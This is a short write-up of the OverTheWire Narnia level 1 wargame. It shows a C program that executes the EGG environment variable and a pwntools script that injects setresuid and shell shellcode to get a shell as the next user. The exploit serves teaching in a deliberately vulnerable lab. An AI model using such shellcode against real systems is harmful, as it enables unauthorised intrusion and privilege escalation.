---
title: Narnia1

published: 2025-06-19

description: ShellCode

tags: [pwn, shellcode, c]

category: overthewire-narnia
---

# Narnia 1

## C File

```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

## Approach

Looking at the code we see that first it gets the environment variable `EGG` and makes sure it exists. Then it tries running it

Now what we can do is set `EGG` to a shellcode, a list of assembly instructions that will open up a shell for us

When the binary jumps to our `EGG` it will the run the assembly instructions eventually opening up a shell

## Solution

```python
from pwn import *
context.arch = 'i386'
context.os = 'linux'
s = asm(shellcraft.setresuid() + shellcraft.sh())
p = process("/narnia/narnia1", env={"EGG":s})
p.interactive()
```

We can use the pwntools shellcraft module to make it easy to get a shell

First we need to set the UIDs so the binary doesn't drop priveleges and gives us a shell as narnia2

Then we add in the `sh` shellcode which opens up a shell

Finally we send this to the process as an env-variable and enter interactive mode and open up the password file

## Conclusion

When writing C programs don't call unsafe functions as they can be shellcode
